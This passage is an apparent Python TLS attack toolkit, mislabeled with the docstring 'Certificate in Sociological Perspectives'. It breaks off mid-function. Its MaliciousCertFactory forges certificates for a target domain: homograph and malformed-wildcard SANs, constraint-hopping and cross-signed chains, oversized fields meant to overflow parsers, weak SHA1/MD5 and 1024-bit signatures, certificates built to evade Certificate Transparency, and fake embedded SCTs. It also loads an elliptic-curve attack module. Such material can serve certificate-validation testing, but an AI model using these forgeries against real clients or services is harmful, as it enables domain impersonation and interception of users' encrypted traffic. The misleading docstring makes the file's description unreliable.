#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Certificate in Sociological Perspectives
"""
from __future__ import annotations

import asyncio
import socket
import ssl
import time
import os
import shutil
import struct
import traceback
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
import subprocess
import logging

# Structured logger for this module
logger = logging.getLogger("cert_sociology")
if not logger.handlers:
    logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(name)s - %(message)s')

# Redirect legacy prints in this module to logger (info level by default)
try:
    import builtins as _builtins
    def _log_print(*args, **kwargs):
        level = str(kwargs.pop('level', 'INFO')).lower()
        msg = " ".join(str(a) for a in args)
        if hasattr(logger, level):
            getattr(logger, level)(msg)
        else:
            logger.info(msg)
    print = _log_print  # only within this module
except Exception:
    pass

# OpenSSL配置 - 支持临时环境变量
OPENSSL_BIN = os.getenv("OPENSSL_BIN") or shutil.which("openssl") or r"C:\Program Files\OpenSSL-Win64\bin\openssl.exe"

# 代理支持配置
PROXY_ENABLED = False
PROXY_URL = None

# 尝试导入代理模块
try:
    from fingerprint_proxy import open_connection as proxy_open_connection
    PROXY_AVAILABLE = True
except ImportError:
    PROXY_AVAILABLE = False
    async def proxy_open_connection(proxy_url, host, port, ssl_context=None, server_hostname=None):
        """Fallback to direct connection if proxy module not available"""
        if ssl_context:
            return await asyncio.open_connection(host, port, ssl=ssl_context, server_hostname=server_hostname)
        else:
            return await asyncio.open_connection(host, port)

# pyOpenSSL导入 - TSX session复用关键
try:
    from OpenSSL import SSL
    PYOPENSSL_AVAILABLE = True
except ImportError:
    PYOPENSSL_AVAILABLE = False
    logger.warning("pyOpenSSL not available, TSX attacks will be limited")

# 辅助函数：安全的SSL握手（带超时保护）
def safe_do_handshake(ssl_conn, sni_name="unknown", timeout=10.0):
    """执行SSL握手，带超时和错误处理"""
    if not PYOPENSSL_AVAILABLE:
        # 如果没有 pyOpenSSL，直接调用
        ssl_conn.do_handshake()
        return True
        
    handshake_steps = 0
    max_handshake_steps = 100
    handshake_timeout = time.perf_counter() + timeout
    
    while handshake_steps < max_handshake_steps:
        if time.perf_counter() > handshake_timeout:
            raise Exception(f"Handshake timeout for {sni_name} after {handshake_steps} steps")
            
        try:
            ssl_conn.do_handshake()
            return True
        except SSL.WantReadError:
            handshake_steps += 1
            time.sleep(0.01)
        except SSL.WantWriteError:
            handshake_steps += 1
            time.sleep(0.01)
    
    raise Exception(f"Handshake failed for {sni_name}: exceeded max steps ({max_handshake_steps})")

from cryptography import x509
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, ec
from cryptography.hazmat.backends import default_backend

# Import P-256 Elliptic Curve Attack Module
try:
    from p256_elliptic import (
        P256Constants, ECProbeFactory, P256EllipticCurve,
        ECPoint, AttackResult, AttackType, NonceSignature,
        InvalidCurveAttacker, run_ec_attacks, P256AttackFramework
    )
    P256_MODULE_AVAILABLE = True
    logger.info("P-256 Elliptic Curve Attack Module loaded successfully")
except ImportError as e:
    P256_MODULE_AVAILABLE = False
    logger.warning(f"P-256 module not available: {e}")
    logger.warning("EC certificate attacks will be limited")

class MaliciousCertFactory:
    """坏蛋证书工厂（可配置）"""
    def __init__(self, logger_ref: Optional[logging.Logger] = None):
        self.logger = logger_ref or logger
    
    @staticmethod
    def create_constraint_hopping_chain(target_domain):
        """创建约束跳跃双链 - 严格链vs宽松链"""
        
        # 生成密钥对
        ca_key = rsa.generate_private_key(65537, 2048, default_backend())
        leaf_key = rsa.generate_private_key(65537, 2048, default_backend())
        
        # 时间设置
        now = datetime.utcnow()
        not_before = now - timedelta(days=30)
        not_after = now + timedelta(days=365)
        
        # 严格CA - 带NameConstraints
        strict_ca_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Strict CA Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, "Strict Intermediate CA"),
        ])
        
        strict_ca = (
            x509.CertificateBuilder()
            .subject_name(strict_ca_name)
            .issuer_name(strict_ca_name)
            .public_key(ca_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(not_before)
            .not_valid_after(not_after)
            .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=True)
            .add_extension(
                x509.NameConstraints(
                    permitted_subtrees=[x509.DNSName("legitimate.com")],
                    excluded_subtrees=None
                ), 
                critical=True
            )
            .sign(ca_key, hashes.SHA256(), default_backend())
        )
        
        # 宽松CA - 无约束
        loose_ca_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Loose CA Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, "Loose Intermediate CA"),
        ])
        
        loose_ca = (
            x509.CertificateBuilder()
            .subject_name(loose_ca_name)
            .issuer_name(loose_ca_name)
            .public_key(ca_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(not_before)
            .not_valid_after(not_after)
            .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=True)
            .sign(ca_key, hashes.SHA256(), default_backend())
        )
        
        # 叶子证书 - 目标域名
        leaf_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Target Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
        ])
        
        # 同一叶子，但可以被两个不同CA签发
        def create_leaf(issuer_cert, issuer_key):
            return (
                x509.CertificateBuilder()
                .subject_name(leaf_name)
                .issuer_name(issuer_cert.subject)
                .public_key(leaf_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(not_before)
                .not_valid_after(not_after)
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                .add_extension(
                    x509.SubjectAlternativeName([
                        x509.DNSName(target_domain),
                        x509.DNSName(f"*.{target_domain}")
                    ]), 
                    critical=False
                )
                .sign(issuer_key, hashes.SHA256(), default_backend())
            )
        
        strict_leaf = create_leaf(strict_ca, ca_key)
        loose_leaf = create_leaf(loose_ca, ca_key)
        
        return {
            'strict_chain': [strict_leaf, strict_ca],
            'loose_chain': [loose_leaf, loose_ca],
            'leaf_key': leaf_key
        }
    
    @staticmethod
    def create_extreme_cert(target_domain):
        """创建极端字段证书 - 测试解析器边界"""
        
        key = rsa.generate_private_key(65537, 2048, default_backend())
        
        # 极端SAN列表
        san_list = []
        for i in range(100):  # 100个SAN
            san_list.append(x509.DNSName(f"test{i}.{target_domain}"))
        
        # 极端Subject
        subject_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "A" * 64),  # 最大长度
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "B" * 64),
            x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
        ])
        
        now = datetime.utcnow()
        
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject_name)
            .issuer_name(subject_name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - timedelta(days=1))
            .not_valid_after(now + timedelta(days=365))
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
            .add_extension(x509.SubjectAlternativeName(san_list), critical=False)
            .sign(key, hashes.SHA256(), default_backend())
        )
        
        return cert, key
    
    @staticmethod
    def create_unicode_confusion_cert(target_domain):
        """创建Unicode混淆证书 - 利用国际化域名绕过"""
        
        key = rsa.generate_private_key(65537, 2048, default_backend())
        
        # Unicode混淆域名
        confusing_domains = [
            target_domain.replace('o', 'о'),  # 西里尔字母 о 替换拉丁字母 o
            target_domain.replace('a', 'а'),  # 西里尔字母 а 替换拉丁字母 a
            target_domain.replace('e', 'е'),  # 西里尔字母 е 替换拉丁字母 e
            f"xn--{target_domain.replace('.', '')}-fake.com",  # Punycode混淆
        ]
        
        # 创建混淆SAN列表
        san_list = [x509.DNSName(target_domain)]  # 正常域名
        for confusing in confusing_domains:
            try:
                san_list.append(x509.DNSName(confusing))
            except Exception:
                continue
        
        subject_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Unicode Test Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, confusing_domains[0]),  # 使用混淆域名作为CN
        ])
        
        now = datetime.utcnow()
        
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject_name)
            .issuer_name(subject_name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - timedelta(days=1))
            .not_valid_after(now + timedelta(days=365))
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
            .add_extension(x509.SubjectAlternativeName(san_list), critical=False)
            .sign(key, hashes.SHA256(), default_backend())
        )
        
        return cert, key
    
    @staticmethod
    def create_extension_overflow_cert(target_domain):
        """创建扩展字段溢出证书 - 测试解析器缓冲区溢出"""
        
        key = rsa.generate_private_key(65537, 2048, default_backend())
        
        # 创建超大SAN列表（可能触发缓冲区溢出）
        san_list = []
        for i in range(1000):  # 1000个SAN条目
            san_list.append(x509.DNSName(f"overflow{i:04d}.{target_domain}"))
        
        # 极端长度的组织名称
        huge_org_name = "OverflowTest" + "A" * 1000  # 超长组织名
        
        subject_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, huge_org_name[:64]),  # 截断到最大长度
            x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
        ])
        
        now = datetime.utcnow()
        
        try:
            cert = (
                x509.CertificateBuilder()
                .subject_name(subject_name)
                .issuer_name(subject_name)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(days=1))
                .not_valid_after(now + timedelta(days=365))
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                .add_extension(x509.SubjectAlternativeName(san_list), critical=False)
                .sign(key, hashes.SHA256(), default_backend())
            )
        except Exception:
            # 如果太大无法创建，减少SAN数量
            san_list = san_list[:100]
            cert = (
                x509.CertificateBuilder()
                .subject_name(subject_name)
                .issuer_name(subject_name)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(days=1))
                .not_valid_after(now + timedelta(days=365))
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                .add_extension(x509.SubjectAlternativeName(san_list), critical=False)
                .sign(key, hashes.SHA256(), default_backend())
            )
        
        return cert, key
    
    @staticmethod
    def create_time_confusion_cert(target_domain):
        """创建时间混淆证书 - 测试时间验证逻辑"""
        
        key = rsa.generate_private_key(65537, 2048, default_backend())
        
        now = datetime.utcnow()
        
        # 时间混淆策略
        time_attacks = [
            # 1. 未来证书（测试时钟偏移容忍度）
            {
                'not_before': now + timedelta(days=1),
                'not_after': now + timedelta(days=366),
                'description': 'future_cert'
            },
            # 2. 过期证书（测试过期容忍度）
            {
                'not_before': now - timedelta(days=366),
                'not_after': now - timedelta(days=1),
                'description': 'expired_cert'
            },
            # 3. 零时间窗口
            {
                'not_before': now,
                'not_after': now,
                'description': 'zero_window'
            }
        ]
        
        # 使用第一种攻击策略（未来证书）
        attack = time_attacks[0]
        
        subject_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, f"TimeAttack-{attack['description']}"),
            x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
        ])
        
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject_name)
            .issuer_name(subject_name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(attack['not_before'])
            .not_valid_after(attack['not_after'])
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
            .add_extension(
                x509.SubjectAlternativeName([x509.DNSName(target_domain)]), 
                critical=False
            )
            .sign(key, hashes.SHA256(), default_backend())
        )
        
        return cert, key
    
    @staticmethod
    def create_weak_signature_cert(target_domain):
        """创建弱签名证书 - 测试签名算法验证"""
        
        try:
            key = rsa.generate_private_key(65537, 1024, default_backend())  # 弱密钥长度
            
            subject_name = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "WeakSig Corp"),
                x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
            ])
            
            now = datetime.utcnow()
            
            # 尝试使用不同的弱签名算法
            weak_algorithms = [
                hashes.SHA1(),     # 首选SHA1
                hashes.MD5(),      # 更弱的MD5
            ]
            
            last_error = None
            for hash_algo in weak_algorithms:
                try:
                    cert = (
                        x509.CertificateBuilder()
                        .subject_name(subject_name)
                        .issuer_name(subject_name)
                        .public_key(key.public_key())
                        .serial_number(x509.random_serial_number())
                        .not_valid_before(now - timedelta(days=1))
                        .not_valid_after(now + timedelta(days=365))
                        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                        .add_extension(
                            x509.SubjectAlternativeName([x509.DNSName(target_domain)]), 
                            critical=False
                        )
                        .sign(key, hash_algo, default_backend())
                    )
                    # Created weak signature cert
                    return cert, key
                except Exception as e:
                    last_error = e
                    # Algorithm not supported, try next
                    continue
            
            # 如果所有弱算法都失败，使用SHA256但密钥长度很短
            # Fallback to SHA256 with weak key
            cert = (
                x509.CertificateBuilder()
                .subject_name(subject_name)
                .issuer_name(subject_name)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(days=1))
                .not_valid_after(now + timedelta(days=365))
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                .add_extension(
                    x509.SubjectAlternativeName([x509.DNSName(target_domain)]), 
                    critical=False
                )
                .sign(key, hashes.SHA256(), default_backend())  # 使用SHA256但保持弱密钥
            )
            
            return cert, key
            
        except Exception as e:
            print(f"[ERROR] create_weak_signature_cert failed: {e}")
            raise
    
    @staticmethod
    def create_critical_extension_bypass_cert(target_domain):
        """创建关键扩展绕过证书 - 测试关键扩展处理"""
        
        key = rsa.generate_private_key(65537, 2048, default_backend())
        
        subject_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "CriticalExt Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
        ])
        
        now = datetime.utcnow()
        
        # 创建带有conflicting critical扩展的证书
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject_name)
            .issuer_name(subject_name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - timedelta(days=1))
            .not_valid_after(now + timedelta(days=365))
            # 冲突的BasicConstraints
            .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=True)  # 声称是CA
            # 但添加了服务器身份验证用途
            .add_extension(
                x509.ExtendedKeyUsage([
                    x509.oid.ExtendedKeyUsageOID.SERVER_AUTH,
                    x509.oid.ExtendedKeyUsageOID.CLIENT_AUTH
                ]), 
                critical=True
            )
            # SAN中包含目标域名
            .add_extension(
                x509.SubjectAlternativeName([x509.DNSName(target_domain)]), 
                critical=True  # 设为关键扩展
            )
            .sign(key, hashes.SHA256(), default_backend())
        )
        
        return cert, key
    
    @staticmethod
    def create_wildcard_confusion_cert(target_domain):
        """创建通配符混淆证书 - 测试通配符验证逻辑"""
        
        key = rsa.generate_private_key(65537, 2048, default_backend())
        
        # 通配符混淆策略
        confusing_wildcards = [
            f"*.*.{target_domain}",           # 双通配符
            f"*{target_domain}",              # 无点通配符
            f"*.{target_domain}.*",           # 中间通配符
            f"*..{target_domain}",            # 双点通配符
            f"sub.*.{target_domain}",         # 部分通配符
        ]
        
        # 创建混淆SAN列表
        san_list = [x509.DNSName(target_domain)]  # 正常域名
        for wildcard in confusing_wildcards:
            try:
                san_list.append(x509.DNSName(wildcard))
            except Exception:
                continue
        
        subject_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Wildcard Test Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, f"*.{target_domain}"),  # 通配符CN
        ])
        
        now = datetime.utcnow()
        
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject_name)
            .issuer_name(subject_name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - timedelta(days=1))
            .not_valid_after(now + timedelta(days=365))
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
            .add_extension(x509.SubjectAlternativeName(san_list), critical=False)
            .sign(key, hashes.SHA256(), default_backend())
        )
        
        return cert, key
    
    @staticmethod
    def create_certificate_transparency_bypass_cert(target_domain):
        """创建证书透明度绕过证书 - 测试CT日志验证"""
        
        key = rsa.generate_private_key(65537, 2048, default_backend())
        
        subject_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "CT Bypass Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
        ])
        
        now = datetime.utcnow()
        
        # 创建没有CT扩展的证书（可能绕过CT检查）
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject_name)
            .issuer_name(subject_name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - timedelta(days=1))
            .not_valid_after(now + timedelta(days=365))
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
            .add_extension(
                x509.SubjectAlternativeName([x509.DNSName(target_domain)]), 
                critical=False
            )
            # 故意不添加CT相关扩展
            .sign(key, hashes.SHA256(), default_backend())
        )
        
        return cert, key
    
    @staticmethod
    def create_cross_signed_leaf(target_domain):
        """创建交叉签名叶证书 - 测试信任链混淆攻击"""
        
        # 生成多个密钥对
        leaf_key = rsa.generate_private_key(65537, 2048, default_backend())
        ca1_key = rsa.generate_private_key(65537, 2048, default_backend())
        ca2_key = rsa.generate_private_key(65537, 2048, default_backend())
        root_key = rsa.generate_private_key(65537, 2048, default_backend())
        
        now = datetime.utcnow()
        not_before = now - timedelta(days=30)
        not_after = now + timedelta(days=365)
        
        # 根CA证书
        root_ca_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Root CA Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, "Trusted Root CA"),
        ])
        
        root_ca = (
            x509.CertificateBuilder()
            .subject_name(root_ca_name)
            .issuer_name(root_ca_name)
            .public_key(root_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(not_before)
            .not_valid_after(not_after)
            .add_extension(x509.BasicConstraints(ca=True, path_length=2), critical=True)
            .add_extension(x509.KeyUsage(
                key_cert_sign=True, crl_sign=True, digital_signature=False,
                content_commitment=False, key_encipherment=False, data_encipherment=False,
                key_agreement=False, encipher_only=False, decipher_only=False
            ), critical=True)
            .sign(root_key, hashes.SHA256(), default_backend())
        )
        
        # 中间CA1 - 由根CA签发
        ca1_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Intermediate CA1 Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, "Intermediate CA 1"),
        ])
        
        ca1_cert = (
            x509.CertificateBuilder()
            .subject_name(ca1_name)
            .issuer_name(root_ca.subject)
            .public_key(ca1_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(not_before)
            .not_valid_after(not_after)
            .add_extension(x509.BasicConstraints(ca=True, path_length=1), critical=True)
            .add_extension(x509.KeyUsage(
                key_cert_sign=True, crl_sign=True, digital_signature=False,
                content_commitment=False, key_encipherment=False, data_encipherment=False,
                key_agreement=False, encipher_only=False, decipher_only=False
            ), critical=True)
            .sign(root_key, hashes.SHA256(), default_backend())
        )
        
        # 中间CA2 - 由根CA签发（交叉签名准备）
        ca2_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Intermediate CA2 Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, "Intermediate CA 2"),
        ])
        
        ca2_cert = (
            x509.CertificateBuilder()
            .subject_name(ca2_name)
            .issuer_name(root_ca.subject)
            .public_key(ca2_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(not_before)
            .not_valid_after(not_after)
            .add_extension(x509.BasicConstraints(ca=True, path_length=1), critical=True)
            .add_extension(x509.KeyUsage(
                key_cert_sign=True, crl_sign=True, digital_signature=False,
                content_commitment=False, key_encipherment=False, data_encipherment=False,
                key_agreement=False, encipher_only=False, decipher_only=False
            ), critical=True)
            .sign(root_key, hashes.SHA256(), default_backend())
        )
        
        # 叶子证书名称（相同内容）
        leaf_subject = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Target Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
        ])
        
        # 相同的叶子证书，但由不同CA签发（交叉签名）
        def create_leaf_cert(issuer_cert, issuer_key, serial_modifier=0):
            return (
                x509.CertificateBuilder()
                .subject_name(leaf_subject)
                .issuer_name(issuer_cert.subject)
                .public_key(leaf_key.public_key())
                .serial_number(x509.random_serial_number() + serial_modifier)
                .not_valid_before(not_before)
                .not_valid_after(not_after)
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                .add_extension(x509.KeyUsage(
                    digital_signature=True, content_commitment=True, key_encipherment=True,
                    data_encipherment=False, key_agreement=False, key_cert_sign=False,
                    crl_sign=False, encipher_only=False, decipher_only=False
                ), critical=True)
                .add_extension(x509.ExtendedKeyUsage([
                    x509.oid.ExtendedKeyUsageOID.SERVER_AUTH,
                    x509.oid.ExtendedKeyUsageOID.CLIENT_AUTH
                ]), critical=True)
                .add_extension(
                    x509.SubjectAlternativeName([
                        x509.DNSName(target_domain),
                        x509.DNSName(f"*.{target_domain}"),
                        x509.DNSName(f"alt-{target_domain}")
                    ]), 
                    critical=False
                )
                .sign(issuer_key, hashes.SHA256(), default_backend())
            )
        
        # 创建交叉签名的叶证书
        leaf_cert_path1 = create_leaf_cert(ca1_cert, ca1_key, 1000)  # 路径1：Root -> CA1 -> Leaf
        leaf_cert_path2 = create_leaf_cert(ca2_cert, ca2_key, 2000)  # 路径2：Root -> CA2 -> Leaf
        
        # 混淆攻击：相同公钥的证书，但来自不同签发路径
        cross_signed_leaf = create_leaf_cert(ca1_cert, ca2_key, 3000)  # 混乱路径：CA1名称但CA2私钥签发
        
        return {
            'root_ca': root_ca,
            'ca1_cert': ca1_cert,
            'ca2_cert': ca2_cert,
            'leaf_path1': [leaf_cert_path1, ca1_cert, root_ca],  # 正常信任链1
            'leaf_path2': [leaf_cert_path2, ca2_cert, root_ca],  # 正常信任链2
            'cross_signed_attack': [cross_signed_leaf, ca1_cert, root_ca],  # 攻击链：混乱签名
            'leaf_key': leaf_key,
            'attack_description': 'Cross-signed leaf with mismatched issuer signature'
        }
    
    @staticmethod
    def create_sct_embedded_cert(target_domain):
        """创建带有伪造SCT的证书 - 测试Certificate Transparency检测绕过"""
        
        key = rsa.generate_private_key(65537, 2048, default_backend())
        
        subject_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "SCT Test Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
        ])
        
        now = datetime.utcnow()
        
        # 创建伪造的SCT数据（模拟CT日志条目）
        # SCT = Signed Certificate Timestamp
        fake_sct_data = bytes([
            0x00,  # SCT version (v1)
            # Log ID (32 bytes) - 伪造的日志ID
            0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0,
            0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
            0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x01, 0x23,
            0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0x02, 0x46
        ])
        
        # 时间戳（8字节）
        timestamp = int(now.timestamp() * 1000).to_bytes(8, 'big')
        fake_sct_data += timestamp
        
        # Extensions length（2字节） + Extensions（此处为空）
        fake_sct_data += bytes([0x00, 0x00])
        
        # Hash algorithm（1字节）+ Signature algorithm（1字节）
        fake_sct_data += bytes([0x04, 0x03])  # SHA256 + ECDSA
        
        # Signature length（2字节）+ 伪造签名（72字节）
        fake_signature = bytes([0x30, 0x46, 0x02, 0x21, 0x00]) + bytes(range(32)) + bytes([0x02, 0x21, 0x00]) + bytes(range(32, 64))
        fake_sct_data += len(fake_signature).to_bytes(2, 'big') + fake_signature
        
        # 创建多个伪造SCT（模拟多个CT日志）
        sct_list = []
        for i in range(3):  # 3个不同的"CT日志"
            modified_sct = bytearray(fake_sct_data)
            modified_sct[1] = i + 1  # 修改日志ID的第一个字节
            sct_list.append(bytes(modified_sct))
        
        # 构建SCT列表格式
        sct_list_data = b''
        for sct in sct_list:
            sct_list_data += len(sct).to_bytes(2, 'big') + sct
        
        # 完整的SCT扩展数据
        full_sct_data = len(sct_list_data).to_bytes(2, 'big') + sct_list_data
        
        # 证书构建
        cert_builder = (
            x509.CertificateBuilder()
            .subject_name(subject_name)
            .issuer_name(subject_name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - timedelta(days=1))
            .not_valid_after(now + timedelta(days=365))
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
            .add_extension(
                x509.SubjectAlternativeName([
                    x509.DNSName(target_domain),
                    x509.DNSName(f"sct-test.{target_domain}")
                ]), 
                critical=False
            )
        )
        
        # 尝试添加自定义SCT扩展（如果支持）
        try:
            # SCT OID: 1.3.6.1.4.1.11129.2.4.2
            sct_oid = x509.ObjectIdentifier("1.3.6.1.4.1.11129.2.4.2")
            cert_builder = cert_builder.add_extension(
                x509.UnrecognizedExtension(sct_oid, full_sct_data),
                critical=False
            )
        except Exception:
            # 如果无法添加自定义扩展，添加注释
            pass
        
        cert = cert_builder.sign(key, hashes.SHA256(), default_backend())
        
        return {
            'cert': cert,
            'key': key,
            'fake_sct_count': len(sct_list),
            'sct_data': full_sct_data,
            'attack_description': 'Certificate with embedded fake SCT to bypass CT detection'
        }
    
    @staticmethod
    def create_weak_ec_cert(target_domain, curve_type="weak_p256"):
        """创建弱椭圆曲线证书 - 测试EC曲线验证"""
        print(f"[*] Creating weak EC certificate with curve type: {curve_type}")
        
        try:
            # 根据曲线类型选择密钥生成策略
            if curve_type == "weak_p256":
                # 使用标准P-256但配置弱参数
                private_key = ec.generate_private_key(
                    ec.SECP256R1(),  # P-256曲线
                    default_backend()
                )
                print("[+] Generated P-256 EC key pair")
                
            elif curve_type == "weak_p192":
                # 使用更弱的P-192曲线
                private_key = ec.generate_private_key(
                    ec.SECP192R1(),  # P-192曲线（更弱）
                    default_backend()
                )
                print("[+] Generated weak P-192 EC key pair")
                
            elif curve_type == "weak_p224":
                # 使用P-224曲线
                private_key = ec.generate_private_key(
                    ec.SECP224R1(),  # P-224曲线
                    default_backend()
                )
                print("[+] Generated P-224 EC key pair")
                
            elif curve_type == "secp256k1":
                # 使用Bitcoin曲线（不同的安全假设）
                private_key = ec.generate_private_key(
                    ec.SECP256K1(),  # Bitcoin/Ethereum使用的曲线
                    default_backend()
                )
                print("[+] Generated SECP256K1 EC key pair (Bitcoin curve)")
                
            else:
                # 默认使用P-256
                private_key = ec.generate_private_key(
                    ec.SECP256R1(),
                    default_backend()
                )
                print("[+] Generated default P-256 EC key pair")
            
            # 创建证书主题
            subject_name = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, f"EC-{curve_type.upper()}"),
                x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
            ])
            
            now = datetime.utcnow()
            
            # 构建证书
            cert_builder = (
                x509.CertificateBuilder()
                .subject_name(subject_name)
                .issuer_name(subject_name)  # 自签名
                .public_key(private_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(days=1))
                .not_valid_after(now + timedelta(days=365))
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                .add_extension(
                    x509.SubjectAlternativeName([
                        x509.DNSName(target_domain),
                        x509.DNSName(f"*.{target_domain}"),
                        x509.DNSName(f"ec-test.{target_domain}")
                    ]), 
                    critical=False
                )
                .add_extension(
                    x509.KeyUsage(
                        digital_signature=True,
                        key_encipherment=False,  # EC不支持密钥加密
                        content_commitment=True,
                        data_encipherment=False,
                        key_agreement=True,  # ECDH密钥协商
                        key_cert_sign=False,
                        crl_sign=False,
                        encipher_only=False,
                        decipher_only=False
                    ),
                    critical=True
                )
            )
            
            # 签名证书
            cert = cert_builder.sign(private_key, hashes.SHA256(), default_backend())
            
            print(f"[+] EC certificate created successfully for {target_domain}")
            print(f"    └─ Curve: {curve_type}, Key size: {private_key.key_size} bits")
            
            return cert, private_key
            
        except Exception as e:
            print(f"[!] Failed to create EC certificate: {e}")
            raise
    

    
    @staticmethod
    def create_ecdsa_nonce_bias_cert(target_domain):
        """创建可能暴露ECDSA nonce偏差的证书"""
        print(f"[*] Creating ECDSA nonce bias test certificate for {target_domain}")
        
        try:
            # 使用P-256曲线（ECDSA最常用）
            private_key = ec.generate_private_key(
                ec.SECP256R1(),
                default_backend()
            )
            
            subject_name = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "ECDSA-Nonce-Test"),
